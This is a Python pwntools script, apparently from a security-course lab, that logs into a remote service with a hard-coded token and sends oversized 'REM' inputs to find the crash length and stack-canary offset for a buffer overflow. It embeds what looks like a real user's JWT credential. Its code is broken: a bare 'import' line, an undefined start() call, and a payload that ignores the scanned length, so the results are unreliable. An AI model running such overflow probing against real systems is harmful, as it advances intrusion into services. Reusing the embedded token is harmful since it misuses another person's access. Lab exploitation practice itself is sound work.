#!/usr/bin/env python3
# find_crash_offset.py
# Usage: python3 find_crash_offset.py
#
# Adjust HOST, PORT, TOKEN as needed.

from pwn import remote, context, log
import sys
import time
import

context.log_level = 'info'

HOST = "inf226.puffling.no"
PORT = 7004
TOKEN = b"-b eyJhbGciOiJFZERTQSIsImtpZCI6ImlkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJUaG9tYXMuQmFydGgiLCJpc3MiOiJodHRwczovL2luZjIyNi5wdWZmbGluZy5ubyIsImlhdCI6MTc1OTEzMzcwMCwic2NvcGUiOlsiaWQiXX0.ogTDQS92Ul2wctc2BY-pjcnq8V6uKPo2nhpvDZYLuHfUtQYcAZvbJT00jzV03oJHpVRXm31qMUdvtJ-05733BQ\n"

# tune these search bounds to be efficient:
START = 0        # minimal number of 'A's to try
END = 600      # maximum number of 'A's to try (increase if needed)
STEP = 8        # step size — use 1 for precise scanning, 8 is a good starting granularity

PROMPT_EXPECT = b"?"   # text to sync on before sending REM; adapt if different


def try_len(n, timeout=1.0):
    """
    Return:
      - True  => process survived (did not crash immediately)
      - False => process crashed (connection closed or explicit segfault)
    """
    try:
        io = start(HOST, PORT, timeout=3)
    except Exception as e:
        log.error(f"connect failed: {e}")
        return False

    try:
        # sync to token prompt
        # adapt if service text differs
        io.recvuntil(b"Please enter your token: ")
        io.sendline(TOKEN)

        # read until prompt
        # sometimes multiple lines; read until PROMPT_EXPECT or timeout
        try:
            io.recvuntil(PROMPT_EXPECT, timeout=2)
        except Exception:
            # maybe prompt is different; try a small read
            try:
                io.recv(timeout=0.5)
            except Exception:
                pass

        payload = b"REM" + b"A" * 100000
        io.sendline(payload)

        # after sending, wait briefly to see crash vs response
        try:
            data = io.recv(timeout=timeout)
            # If connection still gave data, check for explicit crash message
            if b"Segmentation fault" in data or b"stack-protector" in data:
                io.close()
                return False
            # Otherwise we consider this attempt survived (server responded normally)
            io.close()
            return True
        except Exception as e_recv:
            # recv timed out or connection closed -> interpret as crash (server likely died)
            try:
                io.close()
            except:
                pass
            return False

    except Exception as e:
        try:
            io.close()
        except:
            pass
        return False


def find_min_crash():
    last_survived = None
    first_crash = None

    # coarse scan
    for n in range(START, END+1, STEP):
        log.info(f"trying n={n}")
        survived = try_len(n)
        if not survived:
            first_crash = n
            log.success(f"first crash observed at n={n}")
            break
        last_survived = n

    if first_crash is None:
        log.warning(
            "No crash found in coarse scan range. Try increasing END or reduce STEP.")
        return None

    # refine downward to find minimal crashing n
    low = max(START, first_crash - STEP + 1)
    high = first_crash
    for n in range(low, high+1):
        log.info(f"refining n={n}")
        survived = try_len(n)
        if not survived:
            log.success(f"minimal crashing length = {n}")
            return n

    # fallback
    return first_crash


if __name__ == "__main__":
    res = find_min_crash()
    if res is None:
        print("No crash found. Increase END or reduce STEP and try again.")
    else:
        print(
            f"\n=> minimal crashing length of 'A's (after 'REM') appears to be: {res}")
        print("This suggests the canary starts at or before this offset.")
